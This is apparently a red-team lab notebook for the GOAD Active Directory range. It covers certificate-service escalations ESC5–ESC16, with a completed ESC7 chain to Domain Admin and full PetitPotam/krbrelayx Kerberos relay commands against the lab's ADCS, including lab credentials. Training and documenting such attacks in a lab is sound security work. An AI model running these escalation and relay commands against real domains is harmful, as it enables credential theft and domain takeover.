# GOAD Part 14 - ADCS advanced: ESC5/7/9/10/11/13/14/15 (redStackPRO)
<!-- lab-requires: meereen, braavos -->

Reference: [mayfly - GOAD part 14](https://mayfly277.github.io/posts/ADCS-part14/)
(offline: `../_mayfly-source/_posts/2025-03-10-ADCS-part14.md`).
The advanced ESC families (2025 GOAD additions). Driven with certipy **through
the hodor beacon's SOCKS proxy** (`proxychains -q certipy …`; the CA and DC are
internal, see [part 1](part-01-recon.md) Step 1) against **ESSOS-CA** (braavos
`.6`, essos DC meereen `.7`).

> **Status legend:** ✅ PASS · ❌ blocked/absent · ⚠ partial · 🔨 built but never
> run against a live CA · ⏳ needs something else first.

## Headline result (2026-09-07)

**ESC7 → Domain Admin on essos.local** - a second, independent ADCS DA path
after ESC4 (part 6). The rest of the 2025 ESC set is now planted on this build
as well: ESC5 on the PKI's own objects, ESC9 as its own template, and ESC14 as a
weak explicit mapping on missandei.

| Technique | Result |
|-----------|--------|
| ESC7 (viserys manageCA → SubCA officer) | ✅ **DA** (administrator hash) |
| ESC5 (write control over the PKI's objects) | 🔨 built, never run live |
| ESC9 (no security extension) | 🔨 built, never run live |
| ESC13 (issuance policy → group) | 🔨 built; a real defect was fixed, see below |
| ESC14 (weak explicit mapping on missandei) | 🔨 built, never run live |
| ESC10 / ESC15 | 🔨 built (part 6) |
| ESC11 | ⏳ flagged (part 6); RPC-relay, needs a coerce + listener |

**Tooling.** `certipy-ad` 5.1.0 covers ESC1 through ESC16 and is installed
unpinned on both the jumpbox toolkit and the operator, so nothing here needs a
fork. An earlier note in this file asked for `certipy-merged`; that fork existed
only while upstream lagged and is no longer needed.

## ESC7 - manageCA → Domain Admin (the win)

viserys.targaryen holds `ManageCA` (certipy `find` flags *ESC7: dangerous
permissions*). Using the viserys NT hash from [part 6](part-06-adcs.md):

- [x] `certipy ca … -add-officer viserys.targaryen` → *Successfully added
  officer*. `✅`
- [x] `certipy ca … -enable-template SubCA` → *Successfully enabled 'SubCA'*. `✅`
- [x] `certipy req … -template SubCA -upn administrator@essos.local -sid <admin
  SID>` → request denied (expected) with **Request ID 7**, private key saved. `✅`
- [x] `certipy ca … -issue-request 7` → *Successfully issued certificate*; then
  `certipy req … -retrieve 7` → `administrator.pfx`. `✅`
- [x] `certipy auth -pfx administrator.pfx` → **administrator TGT + NT hash**
  `304a…5718d`. `✅ DA`

## Built, and waiting on a live range

Each of these is planted by the compiler now. None has met a real CA, so run
them in this order and record what actually happens.

- [ ] **ESC5** - khal.drogo is granted `GenericAll` on three PKI objects: the
  `ESSOS-CA` enrollment-services object, `CN=NTAuthCertificates`, and the CA's
  computer object. `NTAuthCertificates` is the sharp one: add a CA certificate
  of your own and the forest will authenticate anything you issue. Previously
  this was recorded as unavailable because khal was not a local admin on the CA
  host, which is a different route to the same place; the object ACLs do not
  need shell on the CA at all. `🔨`
- [ ] **ESC9** - template `RSPESC9`, a copy of `User` with
  `CT_FLAG_NO_SECURITY_EXTENSION` (`0x80000`) in `msPKI-Enrollment-Flag`. Pair
  it with write access over an account: set that account's UPN to a privileged
  one, enrol, put the UPN back, then `certipy auth`. It also needs the KDC not
  enforcing strong binding, which is what the ESC10 toggle relaxes on
  kingslanding. `🔨`
- [ ] **ESC14** - missandei carries
  `altSecurityIdentities: X509:<S>CN=missandei.esc14`. That is `X509SubjectOnly`,
  the weakest of the three weak mapping forms, and it means any certificate with
  that subject logs on as her. `RSPESC1` lets the requester supply the subject,
  so the chain is: enrol ESC1 asking for `CN=missandei.esc14`, then authenticate
  as missandei. Strong forms (`X509IssuerSerialNumber`, `X509SKI`,
  `X509SHA1PublicKey`) match things a requester cannot choose, which is the whole
  distinction. Worth showing both ways: with
  `StrongCertificateBindingEnforcement` at its default of 2 the mapping is
  present and the DC refuses it, which is the correct behaviour of a patched
  domain. `🔨`
- [ ] **ESC13** - **a real defect was fixed here, and it is worth checking
  specifically.** The planter wrote `msPKI-Certificate-Name-Flag = 0x8000000`,
  which is `CT_FLAG_SUBJECT_ALT_REQUIRE_DNS`. The flag that builds the subject
  from the directory is `CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH`, `0x80000000` -
  one zero longer. Nothing failed: the template planted, published and enrolled,
  and the certificate came back with a DNS SAN, no UPN and no SID extension, so
  a DC had nothing to map to an account. The flag is now inherited from the
  built-in `User` template. Enrol it and confirm the issued certificate carries a
  UPN, then confirm the token carries `greatmaster`. The same typo was in the
  ESC4 planter, which is also what NHA's `SignatureValidation` template uses. `🔨`
- [ ] **ESC11** - flagged on the CA (part 6); RPC relay, needs a coerce +
  listener. `⏳`

## The two that are not on this lab

**ESC16** is built and in the catalog, and is deliberately **not declared on
goad**. It is `certutil -setreg policy\DisableExtensionList +1.3.6.1.4.1.311.25.2`,
which stops the CA putting the SID security extension in anything it issues -
the CA-wide version of what ESC9 asks for on one template. Turning it on here
would make the ESC9 template teach nothing, because it would behave identically
with its flag removed and a learner could not tell which misconfiguration they
had exploited. A test enforces that no lab declares both. Use it as the centre of
its own lab instead.

Note the name reads backwards: `DisableExtensionList` is a list of extensions to
DISABLE, so adding an OID removes that extension. Several write-ups describe the
same command as "allowing" the extension.

**ESC12 is not built and will not be**, because it is not a misconfiguration we
can plant. It needs the CA's private key to live on a physical YubiHSM2, whose
authentication key sits in cleartext at
`HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`, so that shell on the CA host
lets you sign with a key you cannot export. Without the hardware there is nothing
to misconfigure. Document-only, like noPac.

## Bonus - ESC8 on kingslanding with a Kerberos relay
<!-- lab-requires: esc8 -->

Added 2026-09-17, not yet run live. mayfly's part 14 closes with this one, and it
needs a second CA: **sevenkingdoms has one DC and the ADCS service runs on it**,
so the machine has to be coerced **to itself**. Our build now matches, with
`kingslanding` carrying `role: adcs` and `esc8`, which serves `/certsrv` there.

**Why it cannot be the NTLM relay part 6 uses.** Relaying NTLM back to a CA on
the host you just coerced returns 401, which mayfly shows with a packet capture.
Part 6 works because meereen and braavos are two different hosts. Here they are
one, so the relay has to be Kerberos:

```bash
# A DNS record whose name IS the marshalled target (James Forshaw's trick)
proxychains -q dnstool.py -u 'sevenkingdoms.local\jaime.lannister' -p 'cersei' \
  -r "kingslanding1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" \
  -d <listener-ip> --action add <dc-ip> --tcp

proxychains -q petitpotam.py -u 'jaime.lannister' -p 'cersei' -d sevenkingdoms.local \
  'kingslanding1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' kingslanding.sevenkingdoms.local

python3 krbrelayx.py -t 'http://kingslanding.sevenkingdoms.local/certsrv/certfnsh.asp' \
  --adcs --template DomainController -v 'KINGSLANDING$' -ip <listener-ip>

certipy auth -pfx 'KINGSLANDING$.pfx' -domain sevenkingdoms.local -dc-ip <dc-ip>
```

- [ ] Web enrollment answers on kingslanding (`/certsrv/certfnsh.asp` prompts for
  auth). `⏳`
- [ ] The Kerberos relay yields a `KINGSLANDING$` certificate. `⏳`
- [ ] Expect the **NTLM** relay to the same host to return 401. Worth running as
  the negative control, since it is what makes the Kerberos path necessary. `⏳`

> **The listener has to be reachable by the DC.** Both the coerce target and
> krbrelayx's `-ip` are addresses the DC connects back to, so this needs a
> listener inside the range (the jumpbox, or the Kali operator reached through
> it) rather than on the operator's own machine.

## First-pass result log (2026-09-07)

**Part 14 PASS on ESC7.** viserys's manageCA gives a clean second DA path on
essos. At the time of this run the rest of the 2025 ESC family was absent or
unpublished; it has since been built (see the checklist above) but not re-run,
so this log records the 2026-09-07 state and not today's.

### Findings → PAI
- **PZ-11 (fidelity) - complete the 2025 ESC set. CLOSED 2026-09-18 in the
  build, still owed a live run.** ESC5, ESC9 and ESC14 are planted as toggles
  and declared on this lab; ESC13 always publishes and its subject flag is
  fixed; ESC10 and ESC15 were already there. What remains is running them, which
  is the checklist above.
- **Tooling (PZ-2): resolved by upstream, no fork needed.** `certipy-ad` 5.1.0
  covers ESC1-ESC16 and is installed unpinned on the jumpbox toolkit and the
  operator. The note asking for `certipy-merged` dated from when mainline
  certipy stopped at ESC11.
- **certipy interactive prompt:** `req` on a denied SubCA asks "save private
  key?" - answer `y` (pipe it) or the key is lost and the retrieved cert is
  unusable.
- **Lab artifacts:** viserys is now a CA officer, `SubCA` is enabled, and
  requests 5/7 were issued - revert (disable SubCA, remove officer, revoke) for a
  clean state.
